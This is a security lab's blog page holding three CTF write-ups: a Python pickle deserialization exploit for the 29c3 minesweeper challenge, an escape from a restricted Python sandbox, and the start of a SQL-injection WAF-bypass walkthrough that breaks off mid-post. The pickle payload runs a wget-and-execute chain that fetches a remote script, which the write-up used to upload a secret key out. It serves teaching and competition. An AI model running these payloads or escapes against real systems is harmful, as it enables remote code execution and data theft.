@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<meta charset="UTF-8" />
+<title>NYU Poly ISIS Lab | Exploits of a university research lab</title>
+<link rel="profile" href="http://gmpg.org/xfn/11" />
+<link rel="stylesheet" type="text/css" media="all" href="http://isisblogs.poly.edu/wp-content/themes/twentyten/style.css" />
+<link rel="pingback" href="http://isisblogs.poly.edu/xmlrpc.php" />
+<link rel="alternate" type="application/rss+xml" title="NYU Poly ISIS Lab &raquo; Feed" href="http://isisblogs.poly.edu/feed/" />
+<link rel="alternate" type="application/rss+xml" title="NYU Poly ISIS Lab &raquo; Comments Feed" href="http://isisblogs.poly.edu/comments/feed/" />
+		<script type="text/javascript">
+		//<![CDATA[
+		var infiniteScroll = {"settings":{"id":"content","ajaxurl":"http:\/\/isisblogs.poly.edu\/?infinity=scrolling","type":"scroll","wrapper":true,"wrapper_class":"infinite-wrap","footer":"wrapper","text":"Load more posts","totop":"Scroll back to top","order":"DESC","scripts":[],"styles":[],"google_analytics":false,"offset":0,"history":{"host":"isisblogs.poly.edu","path":"\/page\/%d\/","use_trailing_slashes":true},"stats":"blog=2555824&host=isisblogs.poly.edu&v=ext&j=1:2.1.2&x_pagetype=infinite-jetpack"}};
+		//]]>
+		</script>
+		<link rel='stylesheet' id='the-neverending-homepage-css'  href='http://isisblogs.poly.edu/wp-content/plugins/jetpack/modules/infinite-scroll/infinity.css?ver=20120612' type='text/css' media='all' />
+<link rel='stylesheet' id='jetpack-slideshow-css'  href='http://isisblogs.poly.edu/wp-content/plugins/jetpack/modules/shortcodes/css/slideshow-shortcode.css?ver=3.5.1' type='text/css' media='all' />
+<link rel='stylesheet' id='jetpack-widgets-css'  href='http://isisblogs.poly.edu/wp-content/plugins/jetpack/modules/widgets/widgets.css?ver=20121003' type='text/css' media='all' />
+<link rel='stylesheet' id='infinity-twentyten-css'  href='http://isisblogs.poly.edu/wp-content/plugins/jetpack/modules/infinite-scroll/themes/twentyten.css?ver=20121002' type='text/css' media='all' />
+<link rel='stylesheet' id='sharedaddy-css'  href='http://isisblogs.poly.edu/wp-content/plugins/jetpack/modules/sharedaddy/sharing.css?ver=2.1.2' type='text/css' media='all' />
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-includes/js/jquery/jquery.js?ver=1.8.3'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/jetpack/modules/infinite-scroll/infinity.js?ver=20130101'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-includes/js/swfobject.js?ver=2.2-20120417'></script>
+<script type='text/javascript' src='http://s0.videopress.com/js/videopress.js?ver=1.09'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/jetpack/_inc/spin.js?ver=1.2.4'></script>
+<script type='text/javascript' src='http://isisblogs.poly.edu/wp-content/plugins/jetpack/_inc/jquery.spin.js?ver=3.5.1'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://isisblogs.poly.edu/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://isisblogs.poly.edu/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 3.5.1" />
+<link rel='shortlink' href='http://wp.me/aISY' />
+
+<!-- Jetpack Open Graph Tags -->
+<meta property="og:type" content="blog" />
+<meta property="og:title" content="NYU Poly ISIS Lab" />
+<meta property="og:description" content="Exploits of a university research lab" />
+<meta property="og:url" content="http://isisblogs.poly.edu/" />
+<meta property="og:site_name" content="NYU Poly ISIS Lab" />
+<meta id="syntaxhighlighteranchor" name="syntaxhighlighter-version" content="3.1.3" />
+</head>
+
+<body class="home blog infinite-scroll neverending">
+<div id="wrapper" class="hfeed">
+	<div id="header">
+		<div id="masthead">
+			<div id="branding" role="banner">
+								<h1 id="site-title">
+					<span>
+						<a href="http://isisblogs.poly.edu/" title="NYU Poly ISIS Lab" rel="home">NYU Poly ISIS Lab</a>
+					</span>
+				</h1>
+				<div id="site-description">Exploits of a university research lab</div>
+
+										<img src="http://isisblogs.poly.edu/wp-content/uploads/2011/12/isisblogs-leaderboard.png" width="940" height="198" alt="" />
+								</div><!-- #branding -->
+
+			<div id="access" role="navigation">
+			  				<div class="skip-link screen-reader-text"><a href="#content" title="Skip to content">Skip to content</a></div>
+								<div class="menu"><ul><li class="current_page_item"><a href="http://isisblogs.poly.edu/" title="Home">Home</a></li><li class="page_item page-item-2"><a href="http://isisblogs.poly.edu/about/">About</a></li></ul></div>
+			</div><!-- #access -->
+		</div><!-- #masthead -->
+	</div><!-- #header -->
+
+	<div id="main">
+
+		<div id="container">
+			<div id="content" role="main">
+
+			
+	<div id="nav-above" class="navigation">
+		<div class="nav-previous"><a href="http://isisblogs.poly.edu/page/2/" ><span class="meta-nav">&larr;</span> Older posts</a></div>
+		<div class="nav-next"></div>
+	</div><!-- #nav-above -->
+
+
+
+
+			<div id="post-1194" class="post-1194 post type-post status-publish format-standard hentry category-ctf category-exploitation-techniques">
+			<h2 class="entry-title"><a href="http://isisblogs.poly.edu/2013/02/14/29c3ctf-minesweeper/" title="Permalink to 29c3ctf &#8211; minesweeper" rel="bookmark">29c3ctf &#8211; minesweeper</a></h2>
+
+			<div class="entry-meta">
+				<span class="meta-prep meta-prep-author">Posted on</span> <a href="http://isisblogs.poly.edu/2013/02/14/29c3ctf-minesweeper/" title="8:08 pm" rel="bookmark"><span class="entry-date">February 14, 2013</span></a> <span class="meta-sep">by</span> <span class="author vcard"><a class="url fn n" href="http://isisblogs.poly.edu/author/moshe/" title="View all posts by moshe">moshe</a></span>			</div><!-- .entry-meta -->
+
+				<div class="entry-content">
+				<h2>Challenge Overview</h2>
+<p>The challenge was presented as a game to be played over the internet. Players could access the game and play a command line version of minesweeper by connecting to a port on the game server. The ultimate object however was the retrieval of a flag placed in the current working directory of the game server code. Initial recon showed that the game was written in python, and used the python <code>pickle</code> module. Since misuse of this serialization module is known to lead to code vulnerabilities, our goal was to gain remote code execution via a crafted pickle object in order to obtain the flag.</p>
+<p><a href="http://i0.wp.com/isisblogs.poly.edu/wp-content/uploads/2013/02/minesweeper.png?resize=640%2C527"><img class="alignnone size-full wp-image-1196" alt="minesweeper" src="http://i0.wp.com/isisblogs.poly.edu/wp-content/uploads/2013/02/minesweeper.png?resize=640%2C527" data-recalc-dims="1" /></a></p>
+<h2>Vulnerabilities</h2>
+<p>We initially read through the code and the <code>save</code> and <code>load</code> functions immediately stood out. The save game is created by pickling (serializing) the state of the game, and then encrypting it and its hash. Likewise, a saved game is loaded by decrypting the data, validating the hash, and then loading in the pickled data.</p>
+<p>The vulnerability is obvious &#8211; if we can can cause the code to unpickle a malicious object, we can execute arbitrary code on the remote machine. So the question to answer is: How can we access it?</p>
+<p>Let’s examine the save and load procedures in detail.<br />
+There is a 4K keyfile that’s stored on the disk that persists across multiple games.<br />
+The save game is created by concatenating a &#8216;magic&#8217; string, the SHA-1 hash of the pickled save game, and the pickled save game itself, and then XORing that string with the keyfile. The result of this XOR is then base64 encoded and sent to the user.</p>
+<p>The loading is the inverse: Base64-decode the user-input, XOR that with keyfile, examine the magic value and the hash, and then load in the pickled data.</p>
+<p>This simple XOR cipher has a very obvious weakness: If we have an encrypted message and it’s corresponding plaintext, we can compute the key.</p>
+<p>c = m XOR k<br />
+c XOR m = m XOR k XOR m = (m XOR m) XOR k = 0 XOR k = k</p>
+<p>Once we have k, we can encrypt any data we want, and as long as we format it correctly, it will be accepted as a valid savegame.</p>
+<h2>The method of attack</h2>
+<p>In order to get a known message, we created a savegame when the game first began, where the only data stored in the <code>Field</code> object is the location of the mines. When we completed the game, we then knew the location of every mine. At this point, constructing a custom ‘game’ and running the savegame function allowed us to get a known plaintext.</p>
+<pre class="brush: python; light: true; title: ; notranslate" title="">
+# Python code:
+mines = [(0, 3), (1, 10), (2, 13), (3, 5), (4, 4), (4, 12), (5, 13), (7, 11), (8, 8), (9, 4), (9, 12), (9, 13), (10, 10), (10, 11), (10, 12), (11, 2), (13, 6), (13, 15), (14, 0), (15, 5)]
+
+# Build our custom savegame:
+field = Field(16,16,20)
+# Replace the mines with our own
+field.mines = sorted(mines)
+</pre>
+<p>Now, in order to execute arbitrary code, we need to define a class with a <code>__reduce__</code> method, and what it returns will be executed by the remote machine.</p>
+<p>Now the problem is that we only have this single line of code that can be executed, but we need to do more. The simplest approach was to chain a second python script as a full payload, which would upload the keyfile to our FTP server. So we used <a href="http://docs.python.org/2/library/subprocess.html#popen-constructor" title="Python docs for subprocess.Popen"><code>subprocess.Popen</code></a> to execute <code>wget</code>, fetch our script from github, and then execute it.</p>
+<pre class="brush: python; light: true; title: ; notranslate" title="">
+# Build exploit
+# Downloads a python script with wget, and executes it.
+class Payload(dict):
+def __reduce__(self):
+  import subprocess
+  return subprocess.Popen, ('wget http://bit.ly/XXXXXX &amp;amp;&amp;amp; python XXXXXX',0, None, None, None, None, None, False, True)
+</pre>
+<p>Now that we have an exploit and payload, we can put it together:</p>
+<pre class="brush: python; light: true; title: ; notranslate" title="">
+payload = pickle.dumps(Payload(), 1)
+exploit = SECRET + hashlib.sha1(payload).digest() + payload
+
+encrypted = &quot;&quot;
+for i, byte in enumerate(exploit):
+  encrypted += chr(ord(byte) ^ ord(key[i % 4096]))
+encoded = base64.standard_b64encode(encrypted)
+
+print encoded
+</pre>
+<p>And success! &#8216;flag.txt&#8217; is ours!</p>
+<p>Links:</p>
+<ul>
+<li>minesweeper_solver.py : <a href="https://gist.github.com/moshekaplan/4748645" title="minesweeper_solver.py">https://gist.github.com/moshekaplan/4748645</a>
+</li>
+<li>ftp_upload.py :  <a href="https://gist.github.com/moshekaplan/4742072" title="ftp_upload.py">https://gist.github.com/moshekaplan/4742072</a></li>
+</ul>
+<h2>Takeaways</h2>
+<p>Python pickling is dangerous (duh.)<br />
+(wget + bit.ly) &amp;&amp; [interpreter] is a nice and clean way to chain a more-complex payload.<br />
+Notes<br />
+I learned the hard way that <em>only the function returned by <code>__reduce__</code> is executed on the machine that loads in the pickled data</em> &#8211; the rest of the function is executed on the machine that does the pickling.</p>
+<p>A complication we encountered while writing our payload was that we only recovered a ~250 bytes of the 4K key. So we couldn’t encrypt any payload- only ones that were below that size. I tried extracting more key bits by reconstructing the completed saved game (instead of only when it was first started), but the resulting plaintext significantly differed in size from the ciphertext. It was theorized that this was because of the ordering of the key insertion within the internal dictionaries, but it would be nice to confirm this.</p>
+<p>We also looked into pickle shellcoding, but that wasn’t fruitful &#8211; the created payload was larger than the amount of recovered key bits. ( See <a href="www.toniblogs.com/08/2012/security/shellcoding-with-python-pickles/" title="www.toniblogs.com/08/2012/security/shellcoding-with-python-pickles/">www.toniblogs.com/08/2012/security/shellcoding-with-python-pickles/</a> and <a href="https://github.com/tonigithubs/anapickle" title="https://github.com/tonigithubs/anapickle">https://github.com/tonigithubs/anapickle</a> for more details.)</p>
+<p>I initially looked into using the ftp client that’s built-in for sending over the file, but doing that in a shell looked like it was going to be a pain and wouldn’t fit in the size limit.</p>
+<p>The reason <code>subprocess.Popen</code> has so many arguments is because we need the <code>shell</code> argument to be true, in order to execute a shell command that launches more than one program.</p>
+							</div><!-- .entry-content -->
+	
+			<div class="entry-utility">
+									<span class="cat-links">
+						<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="http://isisblogs.poly.edu/categories/ctf/" title="View all posts in CTF" rel="category tag">CTF</a>, <a href="http://isisblogs.poly.edu/categories/exploitation-techniques/" title="View all posts in Exploitation Techniques" rel="category tag">Exploitation Techniques</a>					</span>
+					<span class="meta-sep">|</span>
+												<span class="comments-link"><a href="http://isisblogs.poly.edu/2013/02/14/29c3ctf-minesweeper/#respond" title="Comment on 29c3ctf &#8211; minesweeper">Leave a comment</a></span>
+							</div><!-- .entry-utility -->
+		</div><!-- #post-## -->
+
+		
+	
+
+
+			<div id="post-1104" class="post-1104 post type-post status-publish format-standard hentry category-ctf category-exploitation-techniques">
+			<h2 class="entry-title"><a href="http://isisblogs.poly.edu/2012/10/26/escaping-python-sandboxes/" title="Permalink to Escaping Python Sandboxes" rel="bookmark">Escaping Python Sandboxes</a></h2>
+
+			<div class="entry-meta">
+				<span class="meta-prep meta-prep-author">Posted on</span> <a href="http://isisblogs.poly.edu/2012/10/26/escaping-python-sandboxes/" title="1:51 am" rel="bookmark"><span class="entry-date">October 26, 2012</span></a> <span class="meta-sep">by</span> <span class="author vcard"><a class="url fn n" href="http://isisblogs.poly.edu/author/moshe/" title="View all posts by moshe">moshe</a></span>			</div><!-- .entry-meta -->
+
+				<div class="entry-content">
+				<p><em>Note: This is all written for Python 2.7.3. These details might be different in other versions of Python &#8211; especially 3+!</em></p>
+<p>Attempting to escape a sandbox is always a fun challenge. Python sandboxes are no exception.<br />
+In a static language, this is usually done by analyzing the code to see if certain functions are called, or wrapping the dangerous functions with code that does validation. However, this is a bit more challenging in dynamic languages like Python.</p>
+<p>A simple approach to sandboxing is to scan the contents of the script for certain keywords or functions that are dangerous, like eval, exec, execfile, and import. That can easily be bypassed by encoding your script. <a title="python.org/dev/peps/pep-0263/" href="http://www.python.org/dev/peps/pep-0263/">PEP-0263</a>&nbsp;goes into the details, but as long as you have <code># coding:&lt;encoding&gt;</code> on one of the first two lines in the script, the Python interpreter will interpret that entire script with that encoding.</p>
+<pre class="brush: python; light: true; title: ; notranslate" title="">
+# coding: rot_13
+# &quot;import evil_module&quot; encoded in ROT13
+'vzcbeg rivy_zbqhyr'
+</pre>
+<p>Obviously, a better method is needed. But before we go into that, some background:</p>
+<p><code>dir</code> is your first tool for examining python objects. To quote the docs: &#8220;<em>Without arguments, return the list of names in the current local scope. With an argument, attempt to return a list of valid attributes for that object.</em>&#8221;</p>
+<p>It doesn&#8217;t claim to be complete, and it&#8217;s possible for a class to define a <code>__dir__</code> method, but for now we can assume it will be accurate.</p>
+<p>The second function I often use is <code>type</code>. Simply enough, with a single parameter, it gives you the type of an object &#8211; this can be useful for understanding what something is, once you know about it&#8217;s existence. Again, to refer to the docs: &#8220;<em>Return the type of an object. The return value is a type object.</em>&#8221;</p>
+<p>So now let&#8217;s start poking.</p>
+<p>When execution begins, the following objects are in the local scope (yay <code>dir()</code>!):</p>
+<pre class="brush: python; light: true; title: ; notranslate" title="">
+&gt;&gt;&gt; dir()
+['__builtins__', '__doc__', '__name__', '__package__']
+</pre>
+<p>From these, <code>__builtins__</code> is most interesting.</p>
+<pre class="brush: python; light: true; title: ; notranslate" title="">
+&gt;&gt;&gt; type(__builtins__)
+&lt;type 'module'&gt;
+</pre>
+<p>Hmm, let&#8217;s see the Python language reference:<br />
+<em>&#8220;A module object has a namespace implemented by a dictionary object &#8230; Attribute references are translated to lookups in this dictionary, e.g., <code>m.x</code> is equivalent to <code>m.__dict__["x"]"</code></em></p>
+<p>Now, we can examine the builtins simply by running <code>dir(__builtins__)</code><br />
+That list is a little long. The entries are all of the builtin types and functions.</p>
+<p>So now let&#8217;s revisit the previous string-checking method for sandboxing.<br />
+Perhaps you don&#8217;t have the ability to change the encoding for the entire file.<br />
+You can still encode the name of a single function call by accessing the module&#8217;s underlying dict, and then using a variable to access the needed function.<br />
+So let&#8217;s call <code>import os</code> in a slightly sneakier way, using the builtin function <code>__import__</code>:<br />
+First get the base64 version of the strings <code>"__import__"</code> and <code>"os"</code>:</p>
+<pre class="brush: python; light: true; title: ; notranslate" title="">
+&gt;&gt;&gt; import base64
+&gt;&gt;&gt; base64.b64encode('__import__')
+'X19pbXBvcnRfXw=='
+&gt;&gt;&gt; base64.b64encode('os')
+'b3M='
+</pre>
+<p>Putting it together:</p>
+<pre class="brush: python; light: true; title: ; notranslate" title="">
+&gt;&gt;&gt; __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))
+&lt;module 'os' from '/usr/lib/python2.7/os.pyc'&gt;
+</pre>
+<p>Hmm, so using text filtering to sandbox code is clearly out.</p>
+<p>Perhaps we can take another approach at filtering, based on using <code>__builtins__.__dict__</code>.<br />
+Since <code>__builtins__.__dict__</code> is a dictionary that represents all of the builtin functions available to our environment, if we modify one of those entries we can change what&#8217;s available for the environment.</p>
+<p>For example, the <code>abs</code> function returns the absolute value of a number:</p>
+<pre class="brush: python; gutter: false; title: ; notranslate" title="">
+&gt;&gt;&gt; abs(-1)
+1
+</pre>
+<p>Now, let&#8217;s play with it a bit:</p>
+<pre class="brush: python; gutter: false; title: ; notranslate" title="">
+&gt;&gt;&gt; __builtins__.__dict__['abs'] = None
+&gt;&gt;&gt; abs(-1)
+Traceback (most recent call last):
+File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
+TypeError: 'NoneType' object is not callable
+</pre>
+<p>The <code>del</code> statement deletes a reference to an object:</p>
+<pre class="brush: python; gutter: false; title: ; notranslate" title="">
+&gt;&gt;&gt; del __builtins__.__dict__['abs']
+&gt;&gt;&gt; abs(-1)
+Traceback (most recent call last):
+File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
+NameError: name 'abs' is not defined
+</pre>
+<p>We just removed the ability for the environment to call <code>abs</code>!<br />
+So now we have another approach to Python sandboxing &#8211; remove access to many &#8216;dangerous&#8217; builtins.</p>
+<p>Let&#8217;s make a small list of dangerous functions:</p>
+<pre class="brush: python; title: ; notranslate" title="">
+&gt;&gt;&gt; del __builtins__.__dict__['__import__'] # __import__ is the function called by the import statement
+&gt;&gt;&gt; del __builtins__.__dict__['eval'] # evaluating code could be dangerous
+&gt;&gt;&gt; del __builtins__.__dict__['execfile'] # likewise for executing the contents of a file
+&gt;&gt;&gt; del __builtins__.__dict__['input'] # Getting user input and evaluating it might be dangerous
+</pre>
+<p>Hmm, this looks a bit safer, right?</p>
+<pre class="brush: python; first-line: 5; title: ; notranslate" title="">
+&gt;&gt;&gt; import os
+Traceback (most recent call last):
+File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
+ImportError: __import__ not found
+</pre>
+<p>Oh wait!</p>
+<p><code>reload(module)</code> reloads an imported module, and executes the code &#8211; so the module gets imported back into our namespace.</p>
+<pre class="brush: python; first-line: 9; title: ; notranslate" title="">
+&gt;&gt;&gt; reload(__builtins__)
+&gt;&gt;&gt; import os
+&gt;&gt;&gt; dir(os)
+</pre>
+<p>I guess we&#8217;ll have to add that to the list.</p>
+<pre class="brush: python; first-line: 12; title: ; notranslate" title="">
+&gt;&gt;&gt; del __builtins__.__dict__['reload'] # they might reload __builtins__ !
+</pre>
+<p>OK. So now we have a safe approach, right? We prevented anyone in our sandbox from using a dangerous builtin, and we can prevent them from using the eval keyword by not allowing them to encode the entire file and scanning the contents. Hopefully we removed all of the dangerous builtins&#8230;</p>
+<p>Let&#8217;s take a challenge from <a href="http://2012.hack.lu/index.php/CaptureTheFlag" title="http://2012.hack.lu/index.php/CaptureTheFlag">Hack.lu&#8217;s CTF</a>.<br />
+In their challenge, you need to read the contents of a file, &#8216;./key&#8217;.</p>
+<p>They first destroy the builtin functions for opening a file by deleting the references.<br />
+Then they allow you to execute user input.<br />
+Take a look at a slightly-modified version of their code:</p>
+<pre class="brush: python; title: ; notranslate" title="">
+def make_secure():
+    UNSAFE = ['open',
+              'file',
+              'execfile',
+              'compile',
+              'reload',
+              '__import__',
+              'eval',
+              'input']
+    for func in UNSAFE:
+        del __builtins__.__dict__[func]
+
+from re import findall
+# Remove dangerous builtins
+make_secure()
+print 'Go Ahead, Expoit me &gt;;D'
+
+while True:
+    try:
+        # Read user input until the first whitespace character
+        inp = findall('\S+', raw_input())[0]
+        a = None
+        # Set a to the result from executing the user input
+        exec 'a=' + inp
+        print 'Return Value:', a
+    except Exception, e:
+	print 'Exception:', e
+</pre>
+<p>Encoding tricks won&#8217;t work &#8211; we don&#8217;t have a reference to <code>file</code> or <code>open</code> in the <code>__builtins__</code>. But perhaps we can dig up a reference to <code>file</code> or <code>open</code> from another location in the interpreter and use that instead?</p>
+<p>Let&#8217;s dig a bit.</p>
+<p>(For this section I need to give credit to <a title="http://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html" href="http://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html">Ned Batchelder</a>. I was reading his blog this past summer, and he has a nice writeup about how <code>eval</code> is an extremely dangerous statement, and he goes through this method in his code.)</p>
+<p>As mentioned earlier, running <code>type</code> on an object returns a <code>type object</code>.<br />
+For example:</p>
+<pre class="brush: python; light: true; title: ; notranslate" title="">
+&gt;&gt;&gt; type( [1,2,3] )
+&lt;type 'list'&gt;
+</pre>
+<p>Now, let&#8217;s start examining the fields of a tuple:</p>
+<pre class="brush: python; light: true; title: ; notranslate" title="">
+&gt;&gt;&gt; dir( () )
+['__add__', '__class__', '__contains__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__getslice__', '__gt__', '__hash__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'count', 'index']
+</pre>
+<p>Most of these are functions. But <code>__class__</code> is a bit interesting. It returns the class representing the object.</p>
+<pre class="brush: python; light: true; title: ; notranslate" title="">
+&gt;&gt;&gt; type(().__class__)
+&lt;type 'type'&gt;
+</pre>
+<p>This gets into metaclass and metatype details. That&#8217;s all in <a href="http://www.python.org/dev/peps/pep-0253/" title="http://www.python.org/dev/peps/pep-0253/">PEP 0253</a>. Let&#8217;s ignore that for now and dig a bit deeper.</p>
+<p>According to the <a title="http://docs.python.org/library/stdtypes.html#special-attributes" href="http://docs.python.org/library/stdtypes.html#special-attributes">docs</a>, new-style classes have some special attributes. Specifically, <code>__bases__</code>, which contains &#8220;the base classes, in the order of their occurrence in the base class list&#8221; and <code>class.__subclasses__()</code>, which returns a list of all of the subclasses.</p>
+<p>Let&#8217;s examine our tuple.</p>
+<pre class="brush: python; light: true; title: ; notranslate" title="">
+&gt;&gt;&gt; ().__class__.__bases__
+(&lt;type 'object'&gt;,)
+</pre>
+<p>It inherits directly from object.<br />
+I wonder what else does:</p>
+<pre class="brush: python; highlight: [14]; light: true; title: ; notranslate" title="">
+&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()
+[&lt;type 'weakproxy'&gt;, &lt;type 'int'&gt;, &lt;type 'basestring'&gt;,
+&lt;type 'bytearray'&gt;, &lt;type 'list'&gt;, &lt;type 'NoneType'&gt;,
+&lt;type 'NotImplementedType'&gt;, &lt;type 'traceback'&gt;, &lt;type 'super'&gt;,
+&lt;type 'xrange'&gt;, &lt;type 'dict'&gt;, &lt;type 'set'&gt;, &lt;type 'slice'&gt;,
+&lt;type 'staticmethod'&gt;, &lt;type 'complex'&gt;, &lt;type 'float'&gt;,
+&lt;type 'buffer'&gt;, &lt;type 'long'&gt;, &lt;type 'frozenset'&gt;,
+&lt;type 'property'&gt;, &lt;type 'memoryview'&gt;, &lt;type 'tuple'&gt;,
+&lt;type 'enumerate'&gt;, &lt;type 'reversed'&gt;, &lt;type 'code'&gt;,
+&lt;type 'frame'&gt;, &lt;type 'builtin_function_or_method'&gt;,
+&lt;type 'instancemethod'&gt;, &lt;type 'function'&gt;, &lt;type 'classobj'&gt;,
+&lt;type 'dictproxy'&gt;, &lt;type 'generator'&gt;, &lt;type 'getset_descriptor'&gt;,
+&lt;type 'wrapper_descriptor'&gt;, &lt;type 'instance'&gt;, &lt;type 'ellipsis'&gt;,
+&lt;type 'member_descriptor'&gt;, &lt;type 'file'&gt;, &lt;type 'sys.long_info'&gt;,
+... and more!
+</pre>
+<p>We have everything we need right here!</p>
+<p>Then I was able to find the index of <code>file</code> in the list with a few simple lines:</p>
+<pre class="brush: python; light: true; title: ; notranslate" title="">
+&gt;&gt;&gt; all_classes = []
+&gt;&gt;&gt; for entry in ().__class__.__bases__[0].__subclasses__():
+...     all_classes.append(entry.__name__)
+...
+&gt;&gt;&gt; all_classes.index(&quot;file&quot;)
+40
+</pre>
+<p>We can&#8217;t use this code (even rewritten as a list comprehension) in the challenge, because it includes whitespace. But since <code>file</code> is at index 40, we can hard-code that.</p>
+<pre class="brush: python; light: true; title: ; notranslate" title="">
+&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[40]
+&lt;type 'file'&gt;
+</pre>
+<p>Once we have a reference to the file, all we need to do is create a file object and read it:</p>
+<pre class="brush: python; light: true; title: ; notranslate" title="">
+&gt;&gt; ().__class__.__bases__[0].__subclasses__()[40](&quot;./key&quot;).read()
+&quot;This works&quot;
+</pre>
+<p>So to solve the challenge:</p>
+<pre class="brush: plain; gutter: false; title: ; notranslate" title="">
+moshe@moshe-desktop:~$ netcat ctf.fluxfingers.net 2045
+Go Ahead, Expoit me &gt;;D
+().__class__.__bases__[0].__subclasses__()[40](&quot;./key&quot;).read()
+().__class__.__bases__[0].__subclasses__()[40](&quot;./key&quot;).read()
+Return Value: FvibLF0eBkCBk
+</pre>
+<p>On a side note, we didn&#8217;t need to do it in a single statement &#8211; <code>exec</code> runs code in the current context, so we could just as easily maintain state across commands by storing the output of each command in a variable (besides <code>a</code>).</p>
+<pre class="brush: plain; gutter: false; title: ; notranslate" title="">
+moshe@moshe-desktop:~$ netcat ctf.fluxfingers.net 2045
+Go Ahead, Expoit me &gt;;D
+x=23
+x=23
+Return Value: 23
+45
+45
+Return Value: 45
+x
+x
+Return Value: 23
+</pre>
+<div></div>
+<div>Further Reading:</div>
+<div>
+<ul>
+<li>Another bit of&nbsp;magic&nbsp;that could be useful:&nbsp;<a title="http://www.reddit.com/r/Python/comments/hftnp/ask_rpython_recovering_cleared_globals/c1v372r" href="http://www.reddit.com/r/Python/comments/hftnp/ask_rpython_recovering_cleared_globals/c1v372r">http://www.reddit.com/r/Python/comments/hftnp/ask_rpython_recovering_cleared_globals/c1v372r</a></li>
+<li>Ned Batchelder&#8217;s blog post:&nbsp;<a href="http://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html">http://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html</a></li>
+</ul>
+</div>
+							</div><!-- .entry-content -->
+	
+			<div class="entry-utility">
+									<span class="cat-links">
+						<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="http://isisblogs.poly.edu/categories/ctf/" title="View all posts in CTF" rel="category tag">CTF</a>, <a href="http://isisblogs.poly.edu/categories/exploitation-techniques/" title="View all posts in Exploitation Techniques" rel="category tag">Exploitation Techniques</a>					</span>
+					<span class="meta-sep">|</span>
+												<span class="comments-link"><a href="http://isisblogs.poly.edu/2012/10/26/escaping-python-sandboxes/#comments" title="Comment on Escaping Python Sandboxes">1 Comment</a></span>
+							</div><!-- .entry-utility -->
+		</div><!-- #post-## -->
+
+		
+	
+
+
+			<div id="post-1094" class="post-1094 post type-post status-publish format-standard hentry category-uncategorized">
+			<h2 class="entry-title"><a href="http://isisblogs.poly.edu/2012/09/30/csaw-ctf-horseforce-writeup/" title="Permalink to CSAW CTF: HorseForce Writeup" rel="bookmark">CSAW CTF: HorseForce Writeup</a></h2>
+
+			<div class="entry-meta">
+				<span class="meta-prep meta-prep-author">Posted on</span> <a href="http://isisblogs.poly.edu/2012/09/30/csaw-ctf-horseforce-writeup/" title="9:34 pm" rel="bookmark"><span class="entry-date">September 30, 2012</span></a> <span class="meta-sep">by</span> <span class="author vcard"><a class="url fn n" href="http://isisblogs.poly.edu/author/ancat/" title="View all posts by ancat">ancat</a></span>			</div><!-- .entry-meta -->
+
+				<div class="entry-content">
+				<p>This time around, I&#8217;d written a challenge for <a href="https://csawctf.poly.edu/">CSAW CTF</a>. There were 32 challenges, in all sorts of topics such as Web, Reversing, Exploitation, etc. The challenge I wrote was the 300 point Web challenge, HorseForce. </p>
+<div class="separator" style="clear: both;text-align: center">
+<a href="http://1.bp.blogspot.com/-waXz2GjOiFs/UGjd9XdZZgI/AAAAAAAAAWA/ienhWsiUo0o/s1600/horseforcepng.png"><img border="0" src="http://i1.wp.com/1.bp.blogspot.com/-waXz2GjOiFs/UGjd9XdZZgI/AAAAAAAAAWA/ienhWsiUo0o/s320/horseforcepng.png?resize=320%2C152" data-recalc-dims="1" /></a></div>
+<h2>Walkthrough</h2>
+<p>From the start, you&#8217;re given an account to this website and a task: obtain administrative access. After logging in, you are presented with a few pages: news, users, horses. Finding the vulnerability was the easiest task. With mysql errors being printed to screen, all you had to do was throw a quote in every parameter. </p>
+<div class="separator" style="clear: both;text-align: center">
+<a href="http://i1.wp.com/4.bp.blogspot.com/-pnXC7rLecZk/UGjfKisDoDI/AAAAAAAAAWM/BL0j2KoaAnE/s1600/beepboopvulnerabilityfound.png"><img border="0" src="http://i2.wp.com/4.bp.blogspot.com/-pnXC7rLecZk/UGjfKisDoDI/AAAAAAAAAWM/BL0j2KoaAnE/s320/beepboopvulnerabilityfound.png?resize=320%2C156" data-recalc-dims="1" /></a></div>
+<p></p>
+<p>However, proceeding with the typical &#8220;-1 union select 1,2,3&#8211;&#8221; reveals the next hurdle: the Web Application Firewall. From a bit of fuzzing by hand, it&#8217;s trivial to figure out that the firewall only detects attacks when using words like &#8220;union&#8221; and &#8220;select&#8221;. But how do you perform a SQL injection without these basic keywords? Some ideas are (double)url-encoding the query, using comments, or swapping case. The filter was a little smarter than that (just a little) so these tricks wouldn&#8217;t work. The real goal of this challenge is to realize that there are two &#8220;separate&#8221; processes: a firewall, and a vulnerable application. Would it be possible to make the firewall see one thing, and the application another? The answer is yes.<br />
+</p>
+<div class="separator" style="clear: both;text-align: center">
